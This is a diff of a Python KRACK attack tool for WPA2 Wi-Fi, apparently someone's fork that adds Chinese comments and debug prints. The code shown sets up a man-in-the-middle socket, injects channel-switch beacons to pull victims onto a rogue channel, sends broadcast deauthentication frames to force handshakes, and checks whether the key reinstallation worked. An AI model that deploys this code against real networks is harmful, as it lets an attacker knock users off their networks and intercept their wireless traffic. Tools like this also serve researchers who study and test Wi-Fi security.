@@ -15,8 +15,6 @@ from datetime import datetime
 from wpaspy import Ctrl
 
 # TODO:
-# - Mention to disable hardware encryption (similar to other attack test tools)
-# - Test against enterprise authentication. We will also have to forward EAP frames!
 # - Show "-- forwarding" when we haven't confirmed MitM on rouge channel, and "-- MitM'ing" when on rouge channel
 # - If EAPOL-Msg4 has been received on the real channel, the MitM attack has failed (maybe deauthenticate then)
 # - Detect usage off all-zero key by decrypting frames (so we can miss some frames safely)
@@ -70,23 +68,26 @@ class MitmSocket(L2Socket):
 		attach_filter(self.ins, bpf, self.iface)
 
 	def send(self, p):
-		# Hack: set the More Data flag so we can detect injected frames
+		# 所有送出去的封包都要加 radiotap
 		p[Dot11].FCfield |= 0x20
 		L2Socket.send(self, RadioTap()/p)
 		if self.pcap: self.pcap.write(RadioTap()/p)
 		log(DEBUG, "%s: Injected frame %s" % (self.iface, dot11_to_str(p)))
 
 	def _strip_fcs(self, p):
-		# Scapy can't handle FCS field automatically
+		# radiotap header flags 0x00...0: no used FCS failed
+		# .present is flagsfield
 		if p[RadioTap].present & 2 != 0:
+			print('80: ', end='')
+			print(p[RadioTap].present)
 			rawframe = str(p[RadioTap])
-			pos = 8
+			pos = 8 # FCS 在 frame 開頭後第 9 bytes 的地方
 			while ord(rawframe[pos - 1]) & 0x80 != 0: pos += 4
 			# If the TSFT field is present, it must be 8-bytes aligned
 			if p[RadioTap].present & 1 != 0:
 				pos += (8 - (pos % 8))
 				pos += 8
-			# Remove FCS if present
+			# 如果要解析 MPDU 訊息，必須要把 radiotap flag 的部分，然後 & 0x10
 			if ord(rawframe[pos]) & 0x10 != 0:
 				return Dot11(str(p[Dot11])[:-4])
 		return p[Dot11]
@@ -120,8 +121,7 @@ class MitmSocket(L2Socket):
 			log(ALL, "%s: Received frame: %s" % (self.iface, dot11_to_str(p)))
 
 		# FIXME: Strip the FCS if present, and drop the RadioTap header, will make package wrong?
-		# return self._strip_fcs(p)
-		return p[Dot11]
+		return self._strip_fcs(p)
 
 	def close(self):
 		# if self.pcap: self.pcap.close()
@@ -786,6 +786,7 @@ class KRAckAttack():
 
 				if p.haslayer(Dot11WEP):
 					# Use encrypted frames to determine if the key reinstallation attack succeeded
+					# 檢查 KRACK攻擊有沒有成功，
 					self.handle_from_client_pairwise(client, p)
 					self.handle_from_client_groupkey(client, p)
 
@@ -921,7 +922,7 @@ class KRAckAttack():
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
 
-		# Try to deauthenticated all clients, to re handshake
+		# deauthenticated 所有 client端，讓 AP 端重新四次交握
 		dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)
 		deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
 		self.sock_real.send(deauth)
